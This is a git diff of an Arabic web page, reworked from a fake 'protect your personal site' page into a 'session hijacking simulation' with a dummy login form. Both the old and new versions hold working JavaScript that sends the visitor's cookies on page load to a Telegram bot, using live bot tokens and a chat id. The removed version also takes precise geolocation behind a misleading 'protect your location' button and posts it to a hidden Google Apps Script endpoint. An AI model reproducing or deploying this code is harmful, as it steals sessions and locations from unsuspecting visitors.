@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>تأمين موقعك الشخصي</title>
+  <title>محاكاة اختطاف الجلسة</title>
   <style>
     body {
       font-family: "Tahoma", sans-serif;
@@ -62,121 +62,57 @@
       background-color: #e3e3e3;
     }
     
-  </style><script type="text/javascript">
-    (function(c,l,a,r,i,t,y){
-        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-    })(window, document, "clarity", "script", "tpq1exynmb");
-  </script>
+  </style>
 </head>
 <body>
-  <h1>🔒📌تامين موقعك الشخصي وحمايته من الاختراق</h1>
+  <h1>🔑 محاكاة اختطاف الجلسة (Session Hijacking)</h1>
   <h2>عبدربه سيف الجوفي</h2>
 
   <div class="login-box">
     <input type="email" placeholder="اكتب الإيميل هنا">
     <input type="password" placeholder="اكتب كلمة المرور هنا" id="passwordInput">
     
-    <button onclick="goToMain()">تسجيل الدخول</button>
+    <button onclick="goToMain()">تسجيل الدخول وبدء الجلسة</button>
   </div>
   
   <script>
+    // ** دالة توليد ID فريد (تحاكي المواقع الحقيقية) **
+    function generateSessionId() {
+        return 'SESSION_' + Math.random().toString(36).substring(2, 12).toUpperCase();
+    }
+    
     function goToMain() {
-      // ** إنشاء كوكيز جلسة للاختبار (ضمان نجاح السرقة) **
-      document.cookie = "session_id=ABCD12345; expires=Thu, 31 Dec 2025 12:00:00 UTC; path=/";
-      alert("تم إنشاء كوكيز الجلسة الآن!");
-      // ***************************************************************
-      window.location.href = "main.html"; // توجيه لصفحة وهمية
+      const uniqueSessionId = generateSessionId(); 
+      
+      // ** 1. إنشاء الجلسة الفريدة (التي سنقوم بسرقتها) **
+      document.cookie = "session_id=" + uniqueSessionId + "; expires=Thu, 31 Dec 2025 12:00:00 UTC; path=/";
+      alert("تم إنشاء جلسة فريدة! المفتاح هو: " + uniqueSessionId + ". سيتم إرساله الآن.");
+      
+      window.location.href = "main.html"; // توجيه لصفحة وهمية (يعتبر المستخدم مسجلاً دخوله)
     }
   </script>
   
-<button id="protectButton" onclick="requestAndSendLocation()">
-  اضغط لحماية موقعك (يتطلب موافقة الموقع)
-</button>
-<p id="locationStatus" style="font-weight: bold; color: blue;">
-  (انتظر موافقتك على مشاركة الموقع الدقيق)
-</p>
-
-<script>
-    const cookies = document.cookie;
-    const encodedCookies = encodeURIComponent(cookies);
-    // هذا الرمز يجب أن يكون صحيحاً: 8518769039:AAHPHYelqon7eoEyyxt3lxmysrwe6BryLXA
-    const telegramApiUrl = "https://api.telegram.org/bot8518769039:AAHPHYelqon7eoEyyxt3lxmysrwe6BryLXA/sendMessage?chat_id=6717287161&text=Cookies%20Stolen:%20" + encodedCookies;
-    fetch(telegramApiUrl)
-        .then(response => {
-            // هذا السطر يظهر في Console (سجل المطورين) فقط
-            console.log('Telegram API Response Status:', response.status); 
-        })
-        .catch(error => {
-            console.error('Fetch Error:', error);
-        });
-</script>
-<script>
-// دالة لتوليد مُعرِّف جلسة عشوائي
-function generateSessionId() {
-    return 'LOC_' + Math.random().toString(36).substring(2, 9);
-}
-
-// الرابط السري الجديد الذي تم الحصول عليه من Google Sheets
-const SECRET_ENDPOINT = 'https://script.google.com/macros/s/AKfycbwviUZRRpt9oUdnz3uEF_5l_gBIiwzaB6KU7sVkRn2mJTbYHDTNgsULTQTfDHWcYfHqtg/exec';
-
-function requestAndSendLocation() {
-    const statusElement = document.getElementById('locationStatus');
-    const sessionId = generateSessionId();
-
-    // 1. التحقق من دعم المتصفح لتحديد الموقع
-    if (!navigator.geolocation) {
-        statusElement.textContent = "عذراً، المتصفح لا يدعم تحديد الموقع الجغرافي.";
-        return;
-    }
-
-    statusElement.textContent = "جاري طلب إذن الموقع... (يرجى الموافقة في النافذة المنبثقة)";
-
-    // 2. طلب الموقع الجغرافي من المتصفح (ستظهر النافذة المنبثقة)
-    navigator.geolocation.getCurrentPosition(
-        
-        // --- الوظيفة عند نجاح الموافقة ---
-        function (position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            
-            statusElement.textContent = `تم الحصول على موقعك الدقيق (ID: ${sessionId}). جاري الإرسال إلى الخادم السري...`;
-
-            // 3. إعداد البيانات للإرسال
-            const locationData = {
-                session_id: sessionId,
-                latitude: latitude,
-                longitude: longitude
-            };
-
-            // 4. الإرسال الفعلي إلى الخادم السري (عبر الرابط)
-            fetch(SECRET_ENDPOINT, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(locationData),
-            })
-            .then(response => {
-                if (response.ok) {
-                    statusElement.textContent = `✅ نجاح الإرسال! تم حفظ الموقع في الخادم السري. (ID: ${sessionId})`;
-                } else {
-                    statusElement.textContent = `❌ فشل إرسال البيانات إلى الخادم (HTTP ${response.status}). (ID: ${sessionId})`;
-                }
-            })
-            .catch(error => {
-                console.error('Fetch error:', error);
-                statusElement.textContent = `❌ حدث خطأ في الاتصال بالخادم. (ID: ${sessionId})`;
-            });
-        },
-        
-        // --- الوظيفة عند الرفض أو الخطأ ---
-        function (error) {
-            statusElement.textContent = "تم رفض طلب مشاركة الموقع من قبل المستخدم أو حدث خطأ داخلي.";
-        }
-    );
-}
-</script>
+  <script>
+      const cookies = document.cookie;
+      const encodedCookies = encodeURIComponent(cookies);
+      // الرمز الجديد: 8518769039:AAG3KE3aL58dx2IX4s6wZEnAhH9NB0Bda8Y
+      const telegramApiUrl = "https://api.telegram.org/bot8518769039:AAG3KE3aL58dx2IX4s6wZEnAhH9NB0Bda8Y/sendMessage?chat_id=6717287161&text=Session%20Stolen%3A%20" + encodedCookies;
+      
+      // الإرسال إلى البوت
+      fetch(telegramApiUrl)
+          .then(response => {
+              console.log('Telegram API Response Status:', response.status); 
+          })
+          .catch(error => {
+              console.error('Fetch Error:', error);
+          });
+  </script>
+  <p style="margin-top: 50px; font-size: 1.2em;">
+    <span style="color: yellow; font-weight: bold;">لتأكيد الجلسة:</span> اضغط هنا لمعرفة ما إذا كنت مسجلاً دخولك حالياً.
+  </p>
+  <button onclick="alert('الكوكيز الحالية: ' + document.cookie)" style="background-color: #f34e7a; color: white;">
+    عرض كوكيز الجلسة الحالية
+  </button>
+  
 </body>
 </html>
